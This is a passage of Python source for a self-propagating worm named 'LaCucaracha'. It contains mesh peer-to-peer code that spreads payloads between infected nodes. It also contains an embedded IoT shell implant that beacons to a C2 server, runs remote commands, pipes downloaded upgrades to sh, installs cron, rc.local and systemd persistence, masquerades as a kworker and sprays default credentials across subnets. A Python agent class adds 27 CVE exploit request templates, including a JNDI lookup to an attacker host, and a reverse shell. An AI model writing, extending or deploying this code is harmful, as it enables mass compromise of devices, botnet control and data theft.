                s.sendall(announcement.encode()[:4096])
                s.close()
                log.debug(f"Bootstrapped: announced to {peer_ip}")
            except Exception:
                log.debug(f"Bootstrap: {peer_ip} unreachable, removing")
                self.remove_peer(peer_ip)

        self.state = NodeState.ACTIVE
        self.save_to_db()
        self.start_heartbeat()
        log.info(f"Node {self.node_id[:8]}: bootstrap complete with {len(self.peers)} peers")

    # ---- Consensus (simple majority) -----------------------------------------

    def request_consensus(self, topic: str = "leader_election") -> Dict[str, Any]:
        """Request consensus vote from all active peers on a topic.

        Returns the majority decision.
        """
        votes: Dict[str, int] = {}
        for peer_ip in list(self.peers):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((peer_ip, self.port))
                msg = json.dumps({
                    "type": "CONSENSUS_REQUEST",
                    "topic": topic,
                    "node_id": self.node_id,
                })
                s.sendall(msg.encode()[:4096])
                resp = s.recv(4096).decode(errors="replace")
                s.close()
                if resp:
                    data = json.loads(resp)
                    vote = data.get("vote", "abstain")
                    votes[vote] = votes.get(vote, 0) + 1
            except Exception:
                continue

        # Determine majority
        result: Dict[str, Any] = {
            "topic": topic,
            "votes": votes,
            "total_voters": len(self.peers),
            "decision": "unknown",
        }
        if votes:
            max_votes = max(votes.values())
            result["decision"] = [k for k, v in votes.items() if v == max_votes][0]

        return result


# =============================================================================
# MeshNetworkEngine — DHT Discovery + Consensus + Split-Brain
# =============================================================================

class MeshMessageType(Enum):
    PING = "PING"
    PONG = "PONG"
    NODE_LIST = "NODE_LIST"
    PAYLOAD_SYNC = "PAYLOAD_SYNC"
    CONSENSUS_VOTE = "CONSENSUS_VOTE"
    STATE_SYNC = "STATE_SYNC"
    ANNOUNCE = "ANNOUNCE"
    SPLIT_BRAIN_RECOVERY = "SPLIT_BRAIN_RECOVERY"


@dataclass
class MeshMessage:
    """Standard message format for mesh network communication."""
    msg_type: MeshMessageType
    sender_id: str
    sender_ip: str
    payload: Dict = field(default_factory=dict)

    def to_json(self) -> str:
        return json.dumps({
            "type": self.msg_type.value,
            "sender_id": self.sender_id,
            "sender_ip": self.sender_ip,
            "payload": self.payload,
        })

    @classmethod
    def from_json(cls, data: str) -> 'MeshMessage':
        parsed = json.loads(data)
        return cls(
            msg_type=MeshMessageType(parsed["type"]),
            sender_id=parsed["sender_id"],
            sender_ip=parsed["sender_ip"],
            payload=parsed.get("payload", {}),
        )


class ConsistentHashRing:
    """Consistent hashing ring for payload distribution across mesh nodes.

    Maps payload keys to responsible nodes using SHA-256 hashing.
    """

    def __init__(self, nodes: Optional[List[Dict]] = None, replicas: int = 3):
        self.nodes = nodes or []
        self.replicas = replicas
        self._ring: Dict[int, Dict] = {}
        self._sorted_keys: List[int] = []
        self._build_ring()

    def _hash(self, key: str) -> int:
        return int(hashlib.sha3_256(key.encode()).hexdigest(), 16)

    def _build_ring(self) -> None:
        self._ring = {}
        for node in self.nodes:
            node_id = node.get("id", node.get("node_id", str(uuid.uuid4())))
            for i in range(self.replicas):
                hash_key = self._hash(f"{node_id}:{i}")
                self._ring[hash_key] = node
        self._sorted_keys = sorted(self._ring.keys())

    def add_node(self, node: Dict) -> None:
        self.nodes.append(node)
        self._build_ring()

    def remove_node(self, node_id: str) -> None:
        self.nodes = [n for n in self.nodes if n.get("id") != node_id and n.get("node_id") != node_id]
        self._build_ring()

    def get_node(self, key: str) -> Optional[Dict]:
        if not self._sorted_keys:
            return None
        hash_key = self._hash(key)
        for ring_key in self._sorted_keys:
            if ring_key >= hash_key:
                return self._ring[ring_key]
        return self._ring[self._sorted_keys[0]]


class MeshNetworkEngine:
    """DHT-based peer discovery, consensus protocol, and split-brain recovery.

    Provides:
      - DHT peer discovery with periodic refresh
      - Consensus protocol (majority vote)
      - Split-brain detection (partition awareness)
      - Split-brain recovery via reconciliation
      - MeshMessage types for all operations
    """

    def __init__(
        self,
        node: WormNode,
        db: Optional['Database'] = None,
        listen_port: int = 10003,
    ):
        self.node = node
        self.db = db or Database()
        self.listen_port = listen_port
        self._running = False
        self._discovery_thread: Optional[threading.Thread] = None
        self._consensus_thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()

        # DHT ring
        self.hash_ring = ConsistentHashRing(replicas=3)

        # Partition tracking for split-brain detection
        self._known_partitions: Set[str] = set()
        self._partition_timeout: float = 120.0
        self._last_global_sync: float = 0.0

    # ---- Lifecycle -----------------------------------------------------------

    def start(self) -> None:
        """Start the mesh network engine: discovery + consensus threads."""
        if self._running:
            return
        self._running = True
        self._discovery_thread = threading.Thread(target=self._discovery_loop, daemon=True)
        self._discovery_thread.start()
        self._consensus_thread = threading.Thread(target=self._consensus_loop, daemon=True)
        self._consensus_thread.start()
        log.info(f"MeshNetworkEngine started on port {self.listen_port}")

    def stop(self) -> None:
        """Stop the mesh network engine."""
        self._running = False
        if self._discovery_thread:
            self._discovery_thread.join(timeout=5)
        if self._consensus_thread:
            self._consensus_thread.join(timeout=5)
        log.info("MeshNetworkEngine stopped")

    # ---- DHT Peer Discovery --------------------------------------------------

    def _discovery_loop(self) -> None:
        """Periodic DHT peer discovery and refresh."""
        while self._running:
            try:
                time.sleep(random.uniform(30, 60))

                # Refresh the DHT ring with active nodes from DB
                active_nodes = self.db.get_active_nodes()
                if active_nodes:
                    self.hash_ring = ConsistentHashRing(active_nodes, replicas=3)

                # Ping all known peers and remove dead ones
                icmp = ICMPEngine(self.db)
                dead_peers: List[str] = []
                for peer_ip in list(self.node.get_peers()):
                    try:
                        if not icmp.icmp_keepalive(peer_ip):
                            dead_peers.append(peer_ip)
                        else:
                            # Exchange node lists
                            self._exchange_node_list(peer_ip)
                    except Exception:
                        dead_peers.append(peer_ip)

                for dp in dead_peers:
                    self.node.remove_peer(dp)

                # Discover new peers via DHT
                self._discover_new_peers()

                # Check for partitions (split-brain detection)
                self._check_partitions()

                # Global sync every 5 minutes
                if time.time() - self._last_global_sync > 300:
                    self._global_state_sync()
                    self._last_global_sync = time.time()

            except Exception as exc:
                log.error(f"Mesh discovery loop error: {exc}")
                time.sleep(10)

    def _exchange_node_list(self, peer_ip: str) -> None:
        """Exchange node lists with a peer to discover more nodes."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((peer_ip, self.listen_port))

            msg = MeshMessage(
                msg_type=MeshMessageType.NODE_LIST,
                sender_id=self.node.node_id,
                sender_ip=self.node.ip,
                payload={"peers": list(self.node.get_peers())},
            )
            s.sendall(msg.to_json().encode()[:4096])

            try:
                resp = s.recv(4096).decode(errors="replace")
                if resp:
                    response_msg = MeshMessage.from_json(resp)
                    if response_msg.msg_type == MeshMessageType.NODE_LIST:
                        new_peers = response_msg.payload.get("peers", [])
                        for np in new_peers:
                            if np != self.node.ip and np not in self.node.get_peers():
                                self.node.add_peer(np)
                                log.debug(f"Discovered new peer via DHT: {np}")
            except Exception:
                pass

            s.close()
        except Exception:
            pass

    def _discover_new_peers(self) -> None:
        """Discover new peers by probing random IPs in local subnet or known ranges."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            subnet_prefix = ".".join(local_ip.split(".")[:3])
        except Exception:
            subnet_prefix = "192.168.1"

        # Probe a few random IPs
        for _ in range(random.randint(3, 8)):
            probe_ip = f"{subnet_prefix}.{random.randint(1, 254)}"
            if probe_ip == self.node.ip or probe_ip in self.node.get_peers():
                continue
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((probe_ip, self.listen_port))
                msg = MeshMessage(
                    msg_type=MeshMessageType.PING,
                    sender_id=self.node.node_id,
                    sender_ip=self.node.ip,
                    payload={},
                )
                s.sendall(msg.to_json().encode()[:1024])
                resp = s.recv(1024).decode(errors="replace")
                s.close()
                if resp:
                    pong = MeshMessage.from_json(resp)
                    if pong.msg_type == MeshMessageType.PONG:
                        self.node.add_peer(probe_ip)
                        log.info(f"Discovered mesh peer via probing: {probe_ip}")
            except Exception:
                pass

    # ---- Consensus Protocol --------------------------------------------------

    def _consensus_loop(self) -> None:
        """Periodic consensus voting on mesh decisions."""
        while self._running:
            try:
                time.sleep(random.uniform(120, 180))

                # Topics for consensus
                topics = [
                    "leader_election",
                    "payload_distribution",
                    "split_brain_recovery",
                ]
                topic = random.choice(topics)
                result = self.node.request_consensus(topic)

                # Log consensus result
                if result["decision"] != "unknown":
                    self.db.log(
                        f"Consensus on '{topic}': {result['decision']} "
                        f"({result['total_voters']} voters, "
                        f"{sum(result['votes'].values())} votes)",
                        "INFO",
                        "mesh_consensus",
                    )

            except Exception as exc:
                log.error(f"Consensus loop error: {exc}")
                time.sleep(10)

    # ---- Split-Brain Detection & Recovery -----------------------------------

    def _check_partitions(self) -> None:
        """Detect network partitions (split-brain conditions).

        A partition is detected when a peer fails to respond but
        other peers report it as active.
        """
        active_peers = self.node.get_peers()
        if len(active_peers) < 3:
            return  # Not enough peers for meaningful partition detection

        # Check each peer through multiple paths
        icmp = ICMPEngine(self.db)
        for peer_ip in active_peers:
            if not icmp.icmp_keepalive(peer_ip):
                # Ask other peers about this one
                confirmations = 0
                denials = 0
                for other_ip in active_peers:
                    if other_ip == peer_ip:
                        continue
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(3)
                        s.connect((other_ip, self.listen_port))
                        msg = MeshMessage(
                            msg_type=MeshMessageType.PING,
                            sender_id=self.node.node_id,
                            sender_ip=self.node.ip,
                            payload={"target_ip": peer_ip},
                        )
                        s.sendall(msg.to_json().encode()[:1024])
                        resp = s.recv(1024).decode(errors="replace")
                        s.close()
                        if resp:
                            pong = MeshMessage.from_json(resp)
                            if pong.payload.get("alive", False):
                                confirmations += 1
                            else:
                                denials += 1
                    except Exception:
                        denials += 1

                partition_id = f"partition_{peer_ip}"
                if confirmations >= denials and confirmations > 0:
                    # Only we can't reach this peer — possible partition
                    self._known_partitions.add(partition_id)
                    log.warning(f"Split-brain detected: {peer_ip} reachable by others but not us")
                elif denials > confirmations:
                    # Peer is actually dead — remove
                    if partition_id in self._known_partitions:
                        self._known_partitions.discard(partition_id)
                    self.node.remove_peer(peer_ip)
                    self.db.mark_node_dead(
                        self._find_node_id_by_ip(peer_ip)
                    )

    def _find_node_id_by_ip(self, ip: str) -> str:
        """Find a node ID from the DB by IP address."""
        nodes = self.db.get_active_nodes()
        for n in nodes:
            if n["ip"] == ip:
                return n["id"]
        return ""

    def recover_split_brain(self, partition_id: str) -> Dict[str, Any]:
        """Attempt to recover from a split-brain condition.

        Reconciles state by broadcasting recovery messages to all peers.
        """
        result: Dict[str, Any] = {"partition": partition_id, "recovered": False}

        recovery_msg = MeshMessage(
            msg_type=MeshMessageType.SPLIT_BRAIN_RECOVERY,
            sender_id=self.node.node_id,
            sender_ip=self.node.ip,
            payload={
                "partition_id": partition_id,
                "node_state": self.node.to_dict(),
                "timestamp": time.time(),
            },
        )

        # Broadcast to all peers
        for peer_ip in self.node.get_peers():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((peer_ip, self.listen_port))
                s.sendall(recovery_msg.to_json().encode()[:4096])
                s.close()
                result["recovered"] = True
            except Exception:
                continue

        if result["recovered"]:
            self._known_partitions.discard(partition_id)
            log.info(f"Split-brain recovery initiated for {partition_id}")

        return result

    # ---- State Sync ----------------------------------------------------------

    def _global_state_sync(self) -> None:
        """Synchronize global mesh state across all peers.

        Each peer broadcasts its node list and payload list for reconciliation.
        """
        active_nodes = self.db.get_active_nodes()
        payloads = self.db.get_payloads(limit=50)

        sync_msg = MeshMessage(
            msg_type=MeshMessageType.STATE_SYNC,
            sender_id=self.node.node_id,
            sender_ip=self.node.ip,
            payload={
                "nodes": [n["ip"] for n in active_nodes],
                "node_count": len(active_nodes),
                "payload_count": len(payloads),
                "peers": list(self.node.get_peers()),
            },
        )

        # Broadcast to all peers
        for peer_ip in self.node.get_peers():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((peer_ip, self.listen_port))
                s.sendall(sync_msg.to_json().encode()[:4096])
                s.close()
            except Exception:
                continue

        self.db.log(
            f"Global state sync: {len(active_nodes)} nodes, {len(payloads)} payloads",
            "INFO",
            "mesh_sync",
        )

    # ---- Payload Sync --------------------------------------------------------

    def sync_payload(self, payload_id: str, payload_content: str) -> bool:
        """Sync a payload to all mesh peers.

        Returns True if at least one peer received the payload.
        """
        success = False
        payload_msg = MeshMessage(
            msg_type=MeshMessageType.PAYLOAD_SYNC,
            sender_id=self.node.node_id,
            sender_ip=self.node.ip,
            payload={
                "payload_id": payload_id,
                "content": payload_content,
            },
        )

        for peer_ip in self.node.get_peers():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((peer_ip, self.listen_port))
                s.sendall(payload_msg.to_json().encode()[:65536])
                s.close()
                success = True
            except Exception:
                continue

        return success

    # ---- Listener (mesh TCP server, runs in caller thread) -------------------

    def run_listener(self) -> None:
        """Run the mesh listener TCP server.

        This blocks and handles incoming mesh messages.
        Should be run in a dedicated thread.
        """
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", self.listen_port))
            server.listen(10)
            server.settimeout(1.0)
            log.info(f"Mesh listener on port {self.listen_port}")

            while self._running:
                try:
                    conn, addr = server.accept()
                    conn.settimeout(5)
                    data = conn.recv(65536).decode(errors="replace")
                    conn.close()

                    if not data:
                        continue

                    msg = MeshMessage.from_json(data)

                    # Handle message based on type
                    if msg.msg_type == MeshMessageType.PING:
                        pong = MeshMessage(
                            msg_type=MeshMessageType.PONG,
                            sender_id=self.node.node_id,
                            sender_ip=self.node.ip,
                            payload={"alive": True},
                        )
                        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        conn.settimeout(5)
                        conn.connect((addr[0], self.listen_port))
                        conn.sendall(pong.to_json().encode()[:1024])
                        conn.close()

                    elif msg.msg_type == MeshMessageType.NODE_LIST:
                        # Exchange peer lists
                        resp = MeshMessage(
                            msg_type=MeshMessageType.NODE_LIST,
                            sender_id=self.node.node_id,
                            sender_ip=self.node.ip,
                            payload={"peers": list(self.node.get_peers())},
                        )
                        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        conn.settimeout(5)
                        conn.connect((addr[0], self.listen_port))
                        conn.sendall(resp.to_json().encode()[:4096])
                        conn.close()

                        # Add their peers to our list
                        new_peers = msg.payload.get("peers", [])
                        for np in new_peers:
                            if np != self.node.ip:
                                self.node.add_peer(np)

                    elif msg.msg_type == MeshMessageType.PAYLOAD_SYNC:
                        # Store synced payload
                        payload_id = msg.payload.get("payload_id", "")
                        content = msg.payload.get("content", "")
                        if content:
                            phash = hashlib.sha3_256(content.encode()).hexdigest()
                            self.db.store_payload(
                                variant=f"synced_{payload_id[:8]}",
                                content=content,
                                phash=phash,
                                size_bytes=len(content),
                                obfuscation="mesh_sync",
                            )
                            log.info(f"Synced payload {payload_id[:8]} from {addr[0]}")

                    elif msg.msg_type == MeshMessageType.SPLIT_BRAIN_RECOVERY:
                        partition_id = msg.payload.get("partition_id", "unknown")
                        log.info(f"Split-brain recovery message from {addr[0]} for {partition_id}")
                        self._known_partitions.discard(partition_id)

                except socket.timeout:
                    continue
                except Exception as exc:
                    log.debug(f"Mesh listener handler error: {exc}")
                    continue

            server.close()

        except Exception as exc:
            log.error(f"Mesh listener error: {exc}")


# =============================================================================
# Section C End Marker
# =============================================================================
# End of la_section_C.py
#!/usr/bin/env python3
"""
la_section_D.py — IoT Agent + Agent Light + PostExploitEngine
Part of LaCucaracha.py worm (concatenated as Section D)
"""

import base64
import hashlib
import json
import logging
import os
import random
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union
from collections import namedtuple

try:
    import paramiko
    HAVE_PARAMIKO = True
except ImportError:
    HAVE_PARAMIKO = False

try:
    import requests
    HAVE_REQUESTS = True
except ImportError:
    HAVE_REQUESTS = False

log = logging.getLogger("WormMesh")

# ExploitResult — shared across all sections (defined here for standalone validity)
# Will be deduplicated at concatenation; identical definition in later sections is safe.
try:
    ExploitResult  # already defined in earlier section
except NameError:
    from dataclasses import dataclass, field
    @dataclass
    class ExploitResult:
        success: bool = False
        target_ip: str = ""
        target_port: int = 0
        username: str = ""
        detail: str = ""
        error: str = ""
        credential: tuple = ("", "")
        shell: bool = False
        exploit_type: str = "custom"


# ===================================================================
# CHUNK 1 — IoT Shell Agent (Python string template)
# ===================================================================

IOT_AGENT_TEMPLATE = '''#!/bin/sh
#
# WORM AGENT ULTIMATE v1.0 — Zero-Dependency IoT Implant
# by PhonkAlphabet
#
C2_HOST="{c2_host}"
C2_PORT="{c2_port}"
C2_HTTP="http://${{C2_HOST}}:${{C2_PORT}}"
STATIC_TOKEN="CHANGE_ME_STATIC_TOKEN"
BEACON_INTERVAL={beacon_interval}
SCAN_THREADS=10
MAX_TARGETS=500

detect_runtime() {{
    RUNTIME="sh"
    if command -v python3 >/dev/null 2>&1; then RUNTIME="python3"
    elif command -v python2 >/dev/null 2>&1; then RUNTIME="python2"
    elif command -v bash >/dev/null 2>&1; then RUNTIME="bash"
    elif command -v ash >/dev/null 2>&1; then RUNTIME="ash"
    fi
}}

http_post() {{
    local url="$1" data="$2" token="$3"
    if command -v curl >/dev/null 2>&1; then
        curl -s --connect-timeout 10 -X POST "$url" \\
            -H "Content-Type: application/json" \\
            -H "X-Auth-Token: $token" -d "$data" 2>/dev/null
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O - --timeout=10 --post-data="$data" \\
            --header="Content-Type: application/json" \\
            --header="X-Auth-Token: $token" "$url" 2>/dev/null
    else
        echo "$data" | nc "$C2_HOST" "$C2_PORT" -w 5 -q 2 2>/dev/null
    fi
}}

http_get() {{
    local url="$1"
    if command -v curl >/dev/null 2>&1; then
        curl -s --connect-timeout 10 "$url" 2>/dev/null
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O - --timeout=10 "$url" 2>/dev/null
    else
        echo "GET $url" | nc "$C2_HOST" "$C2_PORT" -w 5 -q 2 2>/dev/null
    fi
}}

get_id() {{
    if command -v md5sum >/dev/null 2>&1; then
        hostname 2>/dev/null | md5sum | cut -c1-16
    elif command -v md5 >/dev/null 2>&1; then
        hostname 2>/dev/null | md5 | cut -c1-16
    else
        hostname 2>/dev/null | cut -c1-8$(echo $$ | cut -c1-8)
    fi
}}

get_ip() {{
    ip=$(ifconfig 2>/dev/null | grep -Eo 'inet (addr:)?([0-9]*\\\\.){{3}}[0-9]*' | grep -v '127.0.0.1' | head -n1 | awk '{{print $2}}')
    if [ -z "$ip" ]; then
        ip=$(ip addr 2>/dev/null | grep -Eo 'inet ([0-9]*\\\\.){{3}}[0-9]*' | grep -v '127.0.0.1' | head -n1 | awk '{{print $2}}')
    fi
    echo "${{ip:-0.0.0.0}}"
}}

install_persist() {{
    local sp="$0" ip="/tmp/.worm_agent.sh"
    cp "$sp" "$ip" 2>/dev/null || cat "$0" > "$ip" 2>/dev/null
    chmod +x "$ip" 2>/dev/null
    if command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null; echo "*/5 * * * * sh $ip") | crontab - 2>/dev/null
    fi
    if [ -f /etc/rc.local ] && ! grep -q "worm_agent" /etc/rc.local 2>/dev/null; then
        sed -i "$i sh '$ip' &" /etc/rc.local 2>/dev/null
    fi
    if command -v systemctl >/dev/null 2>&1; then
        cat > /etc/systemd/system/worm-agent.service << 'SVC'
[Unit]
Description=Worm Agent
After=network.target
[Service]
ExecStart=/bin/sh /tmp/.worm_agent.sh
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
SVC
        systemctl enable worm-agent.service 2>/dev/null
        systemctl start worm-agent.service 2>/dev/null
    fi
}}

check_port() {{
    timeout 2 bash -c "echo >/dev/tcp/$1/$2" 2>/dev/null && return 0
    nc -zv "$1" "$2" 2>/dev/null | grep -q open && return 0
    return 1
}}

scan_subnet() {{
    local subnet="$1" base=$(echo "$subnet" | cut -d. -f1-3) found=""
    for i in $(seq 1 254); do
        for port in 23 80 443 8080 8443 21 22 2323 5000 554 5555; do
            if check_port "${{base}}.${{i}}" "$port"; then
                found="$found ${{base}}.${{i}}:$port"
                break
            fi
        done
        sleep 0.1
    done
    echo "$found"
}}

IOT_CREDS="\\
root:root root:admin root:password root:123456 root:pass root:toor \\
root:default root:xc3511 root:vizxv root:anko root:Zte521 root:realtek \\
root:0 root:54321 root:12345 root:admin123 root:xmhdipc root:juantech \\
root:7ujMko0vizxv root:7ujMko0admin root:system root:smcadmin \\
root:1234 root:defaultpass root:pass123 root:letmein \\
root:admin1234 root:5up root:1001chin \\
root:huawei root:zte root:hikvision root:axis root:ubnt \\
root:changeme root:Welcome1 root:Admin@2026 root:master root:access \\
root:admin123 root:passw0rd root:manager root:qwerty \\
admin:admin admin:password admin:123456 admin:pass admin:root \\
admin:admin123 admin:letmein admin:default admin:12345 \\
admin:xc3511 admin:vizxv admin:Zte521 \\
support:support user:user guest:guest \\
pi:raspberry ubnt:ubnt cisco:cisco cisco:cisco123 \\
admin:changeme admin:Welcome1 admin:Admin@2026 \\
root:raspberry root:vyatta root:vyos root:mikrotik"

spray_creds() {{
    local target="$1" port="$2" user pass
    for cred in $IOT_CREDS; do
        user="${{cred%%:*}}"; pass="${{cred##*:}}"
        case "$port" in
            22|23|2323|5555)
                result=$(timeout 3 sh -c "exec 3<>/dev/tcp/$target/$port 2>/dev/null; echo '$user'; sleep 0.3; echo '$pass'; sleep 0.5; read -t 1 line <&3; echo \\"$line\\"; exec 3>&-" 2>/dev/null)
                if echo "$result" | grep -qiE '(#|\\\\$|>|granted|welcome|busybox|shell)'; then
                    echo "SUCCESS:$user:$pass"; return 0
                fi ;;
            80|443|8080|8443|5000)
                if command -v curl >/dev/null 2>&1; then
                    result=$(curl -s --connect-timeout 3 -u "$user:$pass" "http://$target:$port/" 2>/dev/null)
                elif command -v wget >/dev/null 2>&1; then
                    result=$(wget -q -O - --timeout=3 --http-user="$user" --http-password="$pass" "http://$target:$port/" 2>/dev/null)
                fi
                if echo "$result" | grep -qiE '(admin|dashboard|login|status|system|index)'; then
                    echo "SUCCESS:$user:$pass"; return 0
                fi ;;
        esac
    done
    return 1
}}

send_beacon() {{
    local data="{{\\"bot_id\\":\\"$1\\",\\"hostname\\":\\"$2\\",\\"ip\\":\\"$3\\",\\"arch\\":\\"$4\\",\\"platform\\":\\"busybox\\",\\"runtime\\":\\"$RUNTIME\\",\\"token\\":\\"$STATIC_TOKEN\\"}}"
    local resp=$(http_post "${{C2_HTTP}}/beacon" "$data" "$STATIC_TOKEN")
    if echo "$resp" | grep -q '"type":"cmd"'; then
        local cmd=$(echo "$resp" | sed 's/.*"command":"\\\\([^"]*\\\\)".*/\\\\1/')
        local cmd_id=$(echo "$resp" | sed 's/.*"cmd_id":"\\\\([^"]*\\\\)".*/\\\\1/')
        if [ -n "$cmd" ] && [ -n "$cmd_id" ]; then
            local output=$(sh -c "$cmd" 2>&1)
            local ec=$?
            local out_esc=$(echo "$output" | sed 's/"/\\\\\\\\"/g' | tr '\\\\n' ' ')
            http_post "${{C2_HTTP}}/result" "{{\\"cmd_id\\":\\"$cmd_id\\",\\"output\\":\\"$out_esc\\",\\"exit_code\\":$ec,\\"token\\":\\"$STATIC_TOKEN\\"}}" "$STATIC_TOKEN"
        fi
    fi
    if echo "$resp" | grep -q '"upgrade":true'; then
        local upgrade_url=$(echo "$resp" | sed 's/.*"upgrade_url":"\\\\([^"]*\\\\)".*/\\\\1/')
        [ -n "$upgrade_url" ] && http_get "$upgrade_url" | sh 2>/dev/null &
    fi
}}

main() {{
    detect_runtime
    BOT_ID=$(get_id); MY_IP=$(get_ip); HNAME=$(hostname 2>/dev/null || echo "unknown"); ARCH=$(uname -m 2>/dev/null || echo "unknown")
    if [ ! -f /tmp/.worm_installed ]; then install_persist; touch /tmp/.worm_installed; fi
    echo "[kworker/0:0]" > /proc/self/comm 2>/dev/null
    while true; do
        send_beacon "$BOT_ID" "$HNAME" "$MY_IP" "$ARCH"
        sleep $BEACON_INTERVAL
    done
}}
main "$@"
'''


# ===================================================================
# CHUNK 2 — PythonAgentLight
# ===================================================================

class PythonAgentLight:
    """Lightweight Python implant: reverse shell, file upload, cmd exec, persistence."""

    C2_HOST = "127.0.0.1"
    C2_PORT = 10001
    STATIC_TOKEN = "CHANGE_ME_STATIC_TOKEN"

    # 27 CVE payloads — CVE_ID -> (target_port, payload_template)
    CVE_PAYLOADS: Dict[str, Tuple[int, str]] = {
        "CVE-2024-27198": (443, "POST /api/login HTTP/1.1\nHost: {ip}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=admin&__route=@exec:echo CVE_OK"),
        "CVE-2024-1709": (443, "POST /api/v1/admin/login HTTP/1.1\nHost: {ip}\nContent-Type: application/json\n\n{\"username\":\"admin\",\"password\":\"admin\",\"command\":\"echo CVE_OK\"}"),
        "CVE-2023-46604": (80, "GET /api/v1/exec?cmd=echo CVE_OK HTTP/1.1\nHost: {ip}\n"),
        "CVE-2023-3519": (80, "GET /cgi-bin/exec?cmd=echo CVE_OK HTTP/1.1\nHost: {ip}\n"),
        "CVE-2023-34362": (443, "POST /api/v1/upload HTTP/1.1\nHost: {ip}\nContent-Type: multipart/form-data\n\nfile=;echo CVE_OK;"),
        "CVE-2023-23752": (80, "GET /api/index.php/v1/config/application?public=true HTTP/1.1\nHost: {ip}\n"),
        "CVE-2023-32677": (8006, "POST /api/json HTTP/1.1\nHost: {ip}\nContent-Type: application/json\n\n{\"method\":\"exec\",\"params\":{\"cmd\":\"echo CVE_OK\"}}"),
        "CVE-2022-22965": (8080, "GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di HTTP/1.1\nHost: {ip}\n"),
        "CVE-2022-0543": (80, "GET /?cmd=echo CVE_OK HTTP/1.1\nHost: {ip}\n"),
        "CVE-2021-26084": (8080, "GET /pages/createpage-entervariables.action?linkCreation=true&spaceKey=AAA&queryString='+%23context['com.opensymphony.xwork2.ActionContext'].getContext().getMemberAccess().allowPrivateAccess%3dtrue+' HTTP/1.1\nHost: {ip}\n"),
        "CVE-2021-22986": (443, "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {ip}\nContent-Type: application/json\n\n{\"command\":\"echo CVE_OK\"}"),
        "CVE-2021-36260": (443, "POST /SDK/Login HTTP/1.1\nHost: {ip}\nContent-Type: application/json\n\n{\"username\":\"admin\",\"password\":\";echo CVE_OK;\"}"),
        "CVE-2021-21975": (443, "GET /catalog-portal/ui/oauth/redirect?redirectUrl=http://localhost:8080/api/v1/exec?cmd=echo%20CVE_OK HTTP/1.1\nHost: {ip}\n"),
        "CVE-2021-44228": (80, "GET /?x=${jndi:ldap://attacker.dnslog.xyz/test} HTTP/1.1\nHost: {ip}\nUser-Agent: ${jndi:ldap://attacker.dnslog.xyz/test}\n"),
        "CVE-2020-14882": (7001, "GET /console/css/%252e%252e%252fconsole.portal?cmd=echo%20CVE_OK HTTP/1.1\nHost: {ip}\n"),
        "CVE-2020-14750": (7001, "GET /console/css/%252e%252e%252fconsole.portal?cmd=echo%20CVE_OK HTTP/1.1\nHost: {ip}\n"),
        "CVE-2020-25213": (80, "POST /wp-admin/admin-ajax.php?action=file_manager HTTP/1.1\nHost: {ip}\n\ncmd=exec&arg=echo CVE_OK"),
        "CVE-2020-5902": (443, "GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1\nHost: {ip}\n"),
        "CVE-2020-3452": (443, "GET /+CSCOT+/translation-table?type=mst&textdomain=../../../../../etc/passwd&default-language=en HTTP/1.1\nHost: {ip}\n"),
        "CVE-2020-3952": (443, "GET /vsphere-client/ HTTP/1.1\nHost: {ip}\n"),
        "CVE-2019-19781": (443, "GET /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1\nHost: {ip}\n"),
        "CVE-2019-11510": (443, "GET /dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/ HTTP/1.1\nHost: {ip}\n"),
        "CVE-2019-9193": (5432, "PGCOPY\nSELECT 1; COPY (SELECT 1) TO PROGRAM 'echo CVE_OK';"),
        "CVE-2018-7600": (80, "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\nHost: {ip}\nContent-Type: application/x-www-form-urlencoded\n\nform_id=user_register_form&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=echo CVE_OK"),
        "CVE-2018-1000861": (8080, "GET /script?cmd=echo CVE_OK HTTP/1.1\nHost: {ip}\n"),
        "CVE-2017-12635": (5984, "POST /_users/org.couchdb.user:admin HTTP/1.1\nHost: {ip}\nContent-Type: application/json\n\n{\"name\":\"admin\",\"password\":\"admin\",\"roles\":[\"_admin\"],\"type\":\"user\"}"),
        "CVE-2014-6271": (80, "GET /cgi-bin/test.cgi HTTP/1.1\nHost: {ip}\nUser-Agent: () { :; }; echo; echo CVE_OK\n"),
    }

    def __init__(self, c2_host: str = "127.0.0.1", c2_port: int = 10001, static_token: str = "CHANGE_ME_STATIC_TOKEN"):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.static_token = static_token

    # ---- Reverse Shell ----

    def reverse_shell(self, c2_host: str, c2_port: int) -> None:
        """Connect back to C2 and provide an interactive shell."""
        try:
            import pty
